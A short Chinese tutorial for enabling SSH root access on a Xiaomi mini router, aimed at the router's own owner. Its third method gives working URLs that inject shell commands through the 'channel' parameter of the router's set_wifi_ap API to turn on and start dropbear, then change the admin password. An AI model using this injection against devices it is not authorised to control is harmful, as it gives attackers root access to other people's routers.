### 方法一

官方开启，麻烦。官网教程。



### 方法二

升级2.7.11开发版本，然后执行mini.py脚本，重启之后使用putty登陆。root-admin



### 方法三

1.  打开 IE 浏览器，在地址栏中输入小米mini的 IP 地址（默认为：http://192.168.31.1，下文中均为笔者自定义的 IP 地址），回车，输入你设置的管理密码，登录进去。此时地址栏中的网址会变成这种形式：

   http://192.168.31.1/cgi-bin/luci/;stok=《你的stok》/web/home#router

2. 将地址栏中的网址替换为下面，然后回车：

   http://192.168.31.1/cgi-bin/luci/;stok=《你的stok》/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit

   看到网页中出现“{"msg":"未能连接到指定WiFi(Probe timeout)""code":1616}”的字样，表示该命令执行成功。

3. 继续将网址替换成下面，然后回车：

   http://192.168.31.1/cgi-bin/luci/;stok=《你的stok》/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3Bsed%20%2Di%20%22%3Ax%3AN%3As%2Fif%20%5C%5B%2E%2A%5C%3B%20then%5Cn%2E%2Areturn%200%5Cn%2E%2Afi%2F%23tb%2F%3Bb%20x%22%20%2Fetc%2Finit.d%2Fdropbear

   你会看到标签页上有一个小圆圈在转，后面显示“正在等待” 字样，表示命令正在发送，请等待！

   过一会儿，标签页的转动的圆圈会变成网页图标，文字会变成路由器的 IP 地址。

   网页中出现“{"msg":"未能连接到指定WiFi(Probe timeout)""code":1616}”的字样，表示该命令执行成功。

4. 继续将网址替换成下面，然后回车：

   http://192.168.31.1/cgi-bin/luci/;stok=《你的stok》/api/xqnetwork/set_wifi_ap?ssid=tianbao&encryption=NONE&enctype=NONE&channel=1%3B%2Fetc%2Finit.d%2Fdropbear%20start

   判断命令执行成功的方式同第2、3步相同，不再赘述！

5. 继续将网址替换成下面，然后回车：

   http://192.168.31.1/cgi-bin/luci/;stok=《你的stok》/api/xqsystem/set_name_password?oldPwd=《你当前的后台管理密码》&newPwd=《新密码》
   **网页中出现“{"code":0}”的字样，表示修改密码成功！**
   
6. 然后就可以使用putty登陆。root-《新密码》